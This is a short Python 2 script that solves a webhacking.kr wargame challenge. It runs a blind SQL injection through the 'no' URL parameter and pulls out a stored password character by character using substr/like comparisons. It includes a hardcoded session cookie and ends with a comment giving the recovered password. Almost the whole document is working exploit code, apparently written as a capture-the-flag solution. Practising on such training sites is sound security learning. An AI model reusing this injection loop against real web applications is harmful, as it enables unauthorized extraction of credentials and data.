import urllib
import httplib

def main():
    HTTP=httplib.HTTPConnection("webhacking.kr")
    Url="/challenge/web/web-09/index.php?no="
    Headers={"Cookie":"PHPSESSID=4841ee834d02a659d2db1d88912fab71"}
    Passwd=""

    for i in range(len(Passwd)+1,12):
        for c in range(ord("a"),ord("z")+1)+range(ord("0"),ord("9")+1)+range(128,129):
            if c == 128:
                print "[!] Not Found"
                print "[*] Password : %s~" % Passwd
                return False

            Payload="if(substr(id,%d,1)like(0x%x),3,0)" % (i,c)
            HTTP.request("GET",Url+Payload,"",Headers)

            if "Secret" in HTTP.getresponse().read():
                Passwd+=chr(c)
                print "[+] Found : %c" % c
                break

    print "[*] Password : %s" % Passwd
    return True

if __name__ == "__main__":
    main()

#pw is "alsrkswhaql"
